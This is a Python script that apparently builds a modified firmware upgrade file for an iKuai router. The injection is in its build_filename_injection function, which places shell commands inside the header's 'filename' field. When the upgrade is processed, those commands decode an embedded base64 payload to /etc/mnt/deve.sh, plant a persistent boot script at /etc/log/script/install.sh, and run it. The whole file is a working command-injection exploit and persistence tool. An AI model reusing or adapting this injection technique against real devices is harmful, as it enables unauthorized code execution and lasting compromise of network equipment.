#!/usr/bin/env python3
import argparse
import base64
import gzip
import hashlib
import json
import struct
import textwrap
from pathlib import Path


FIXED_GZIP_HEADER = bytes.fromhex("1f8b08006f9b4b590203")


def read_header(path: Path) -> dict:
    data = path.read_bytes()
    head_len = struct.unpack(">I", data[:4])[0]
    return json.loads(gzip.decompress(FIXED_GZIP_HEADER + data[4 : 4 + head_len]))


def build_filename_injection(deve_path: Path, real_filename: str, build: str, gated: bool) -> str:
    deve_gz = gzip.compress(deve_path.read_bytes(), compresslevel=9, mtime=0)
    encoded = base64.b64encode(deve_gz).decode()
    wrapped = "\n".join(textwrap.wrap(encoded, 76))
    tag = f"WG_DEVE_B64_{build}"
    if gated:
        install_body = f"""if grep -q '3.7.24' /etc/release 2>/dev/null; then
    if [ -x /etc/mnt/deve.sh ]; then
        /etc/mnt/deve.sh >/tmp/iktmp/wg_wan_runtime_install.log 2>&1 || true
    fi
    echo '{build} wg web-upgrade installer applied' > /etc/mnt/ikuai/wg_wan_web_upgrade_version 2>/dev/null || true
    echo '{build} wg web-upgrade installer applied' > /tmp/iktmp/wg_wan_web_upgrade_version 2>/dev/null || true
else
    echo "$(date '+%F %T') skip wg install: not 3.7.24 yet" > /tmp/iktmp/wg_wan_runtime_install.log 2>/dev/null || true
fi"""
    else:
        install_body = f"""if [ -x /etc/mnt/deve.sh ]; then
    /etc/mnt/deve.sh >/tmp/iktmp/wg_wan_runtime_install.log 2>&1 || true
fi
echo '{build} wg web-upgrade installer applied' > /etc/mnt/ikuai/wg_wan_web_upgrade_version 2>/dev/null || true
echo '{build} wg web-upgrade installer applied' > /tmp/iktmp/wg_wan_web_upgrade_version 2>/dev/null || true"""
    return f"""x";
mkdir -p /etc/mnt /etc/mnt/ikuai /etc/log/script /tmp/iktmp 2>/dev/null
base64 -d <<'{tag}' | gzip -d > /etc/mnt/deve.sh
{wrapped}
{tag}
chmod 755 /etc/mnt/deve.sh 2>/dev/null || true
cat > /etc/log/script/install.sh <<'WG_BOOT_INSTALL_{build}'
#!/bin/sh
mkdir -p /tmp/iktmp /etc/mnt/ikuai 2>/dev/null
{install_body}
exit 0
WG_BOOT_INSTALL_{build}
chmod 755 /etc/log/script/install.sh 2>/dev/null || true
/etc/log/script/install.sh >/tmp/iktmp/wg_upgrade_header_install.log 2>&1 || true
filename="{real_filename}"""


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-bin", required=True, type=Path)
    parser.add_argument("--payload-gz", required=True, type=Path)
    parser.add_argument("--deve", required=True, type=Path)
    parser.add_argument("--output", required=True, type=Path)
    parser.add_argument("--version", required=True)
    parser.add_argument("--build", required=True)
    parser.add_argument("--firmwareid", required=True)
    parser.add_argument("--sysbit", default="x64")
    parser.add_argument("--timestamp", default=None)
    parser.add_argument("--gated-install", action="store_true")
    args = parser.parse_args()

    payload = args.payload_gz.read_bytes()
    base_header = read_header(args.base_bin)
    real_filename = args.output.name
    header = {
        "filename": build_filename_injection(args.deve, real_filename, args.build, args.gated_install),
        "firmwareid": str(args.firmwareid),
        "version": args.version,
        "sysbit": args.sysbit,
        "timestamp": str(args.timestamp or base_header["timestamp"]),
        "length": str(len(payload)),
        "md5": hashlib.md5(payload).hexdigest(),
        "sha256": hashlib.sha256(payload).hexdigest()[:32],
    }
    header_json = json.dumps(header, separators=(",", ":")).encode()
    header_gz = gzip.compress(header_json, compresslevel=9, mtime=0x594B9B6F)
    header_tail = header_gz[10:]
    gzip.decompress(FIXED_GZIP_HEADER + header_tail)
    if len(header_tail) > 1048576:
        raise SystemExit(f"header_tail too large: {len(header_tail)}")

    args.output.parent.mkdir(parents=True, exist_ok=True)
    data = struct.pack(">I", len(header_tail)) + header_tail + payload
    args.output.write_bytes(data)

    print(f"output: {args.output}")
    print(f"size: {len(data)}")
    print(f"md5: {hashlib.md5(data).hexdigest()}")
    print(f"sha256: {hashlib.sha256(data).hexdigest()}")
    print(f"header_tail_len: {len(header_tail)}")
    print(f"filename_len: {len(header['filename'])}")


if __name__ == "__main__":
    main()
